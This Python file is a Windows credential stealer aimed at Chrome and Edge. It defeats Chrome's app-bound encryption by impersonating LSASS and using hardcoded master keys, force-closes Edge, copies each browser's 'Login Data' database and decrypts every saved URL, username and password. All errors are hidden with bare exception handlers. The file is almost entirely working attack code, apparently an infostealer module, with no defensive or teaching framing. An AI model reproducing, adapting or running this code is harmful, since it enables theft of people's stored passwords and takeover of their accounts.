import os
import json
import sqlite3
import binascii
import shutil
import tempfile
import subprocess
import win32crypt
from base64 import b64decode
from Crypto.Cipher import AES, ChaCha20_Poly1305
from dpapi_utils import impersonate_lsass, dpapi_unprotect, decrypt_with_cng
import io
import struct


def parse_key_blob(blob):
    buf = io.BytesIO(blob)
    header_len = struct.unpack('<I', buf.read(4))[0]
    buf.read(header_len + 4)
    data = {'flag': buf.read(1)[0]}
    
    if data['flag'] in [1, 2]:
        data['iv'] = buf.read(12)
        data['ciphertext'] = buf.read(32)
        data['tag'] = buf.read(16)
    elif data['flag'] == 3:
        data['encrypted_key'] = buf.read(32)
        data['iv'] = buf.read(12)
        data['ciphertext'] = buf.read(32)
        data['tag'] = buf.read(16)
    return data


def derive_master_key(data):
    keys = {
        1: "B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787",
        2: "E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660"
    }
    
    if data['flag'] in [1, 2]:
        key = bytes.fromhex(keys[data['flag']])
        cipher = AES.new(key, AES.MODE_GCM, nonce=data['iv']) if data['flag'] == 1 else ChaCha20_Poly1305.new(key=key, nonce=data['iv'])
    elif data['flag'] == 3:
        xor_key = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
        with impersonate_lsass():
            dec_key = decrypt_with_cng(data['encrypted_key'])
        xored_key = bytes([a ^ b for a, b in zip(dec_key, xor_key)])
        cipher = AES.new(xored_key, AES.MODE_GCM, nonce=data['iv'])
    
    return cipher.decrypt_and_verify(data['ciphertext'], data['tag'])


def get_master_key(browser_path, browser_name):
    """Get master key for Chrome or Edge"""
    local_state_path = os.path.join(browser_path, "Local State")
    if not os.path.exists(local_state_path):
        return None
        
    try:
        with open(local_state_path, "r") as f:
            local_state = json.load(f)
        
        os_crypt = local_state.get("os_crypt", {})
        
        # Chrome uses app_bound_encrypted_key
        if browser_name == "Chrome" and "app_bound_encrypted_key" in os_crypt:
            enc_key = binascii.a2b_base64(os_crypt["app_bound_encrypted_key"])[4:]
            blob = dpapi_unprotect(dpapi_unprotect(enc_key, system=True))
            return derive_master_key(parse_key_blob(blob))
        
        # Edge uses encrypted_key
        if browser_name == "Edge" and "encrypted_key" in os_crypt:
            encrypted_key = b64decode(os_crypt["encrypted_key"])[5:]
            return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            
    except:
        pass
    return None


def decrypt_password(ciphertext, master_key, browser_name):
    """Decrypt password for Chrome or Edge"""
    if not ciphertext or len(ciphertext) < 3:
        return None
    
    try:
        # v20 format (AES-GCM)
        if ciphertext[:3] == b"v20":
            iv, encrypted_password, tag = ciphertext[3:15], ciphertext[15:-16], ciphertext[-16:]
            cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
            return cipher.decrypt_and_verify(encrypted_password, tag).decode()
        
        # v10 format
        if ciphertext[:3] == b"v10":
            encrypted_data = ciphertext[3:]
            
            # Edge v10 uses AES-GCM with master key
            if browser_name == "Edge" and master_key and len(encrypted_data) >= 28:
                try:
                    iv, encrypted_password, tag = encrypted_data[:12], encrypted_data[12:-16], encrypted_data[-16:]
                    cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
                    return cipher.decrypt_and_verify(encrypted_password, tag).decode()
                except:
                    pass
            
            # Chrome v10 or Edge fallback uses DPAPI
            try:
                decrypted = win32crypt.CryptUnprotectData(encrypted_data, None, None, None, 0)[1]
                return decrypted.decode('utf-8')
            except:
                pass
        
        # Legacy format (direct DPAPI)
        try:
            decrypted = win32crypt.CryptUnprotectData(ciphertext, None, None, None, 0)[1]
            return decrypted.decode('utf-8')
        except:
            pass
            
    except:
        pass
    return None


def extract_browser_passwords(browser_name, browser_path):
    """Extract passwords from Chrome or Edge"""
    results = []
    
    if not os.path.exists(browser_path):
        return results
    
    # Close Edge processes
    if browser_name == "Edge":
        try:
            subprocess.run(['taskkill', '/F', '/IM', 'msedge.exe'], capture_output=True, check=False)
        except:
            pass
    
    # Get master key
    master_key = get_master_key(browser_path, browser_name)
    
    # Process Login Data file
    login_data_path = os.path.join(browser_path, "Default", "Login Data")
    if not os.path.exists(login_data_path):
        return results
    
    temp_db = os.path.join(tempfile.gettempdir(), f"{browser_name.lower()}_{os.getpid()}.db")
    
    try:
        shutil.copy2(login_data_path, temp_db)
        con = sqlite3.connect(temp_db)
        cursor = con.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        for url, user, enc_pwd in cursor.fetchall():
            if enc_pwd and user and url:
                password = decrypt_password(enc_pwd, master_key, browser_name)
                results.append({
                    'browser': browser_name,
                    'url': url,
                    'username': user,
                    'password': password if password else '[ERROR - Could not decrypt]'
                })
        
        cursor.close()
        con.close()
    except:
        pass
    finally:
        try:
            os.unlink(temp_db)
        except:
            pass
    
    return results


def fetch_chromium_passwords():
    """Extract passwords from Chrome and Edge"""
    all_results = []
    profile = os.environ['USERPROFILE']
    
    browsers = {
        'Chrome': rf"{profile}\AppData\Local\Google\Chrome\User Data",
        'Edge': rf"{profile}\AppData\Local\Microsoft\Edge\User Data"
    }
    
    for browser_name, browser_path in browsers.items():
        results = extract_browser_passwords(browser_name, browser_path)
        all_results.extend(results)
    
    return all_results


def fetch_chrome_passwords():
    """Extract Chrome passwords only"""
    profile = os.environ['USERPROFILE']
    chrome_path = rf"{profile}\AppData\Local\Google\Chrome\User Data"
    return extract_browser_passwords("Chrome", chrome_path)


def fetch_edge_passwords():
    """Extract Edge passwords only"""
    profile = os.environ['USERPROFILE']
    edge_path = rf"{profile}\AppData\Local\Microsoft\Edge\User Data"
    return extract_browser_passwords("Edge", edge_path)
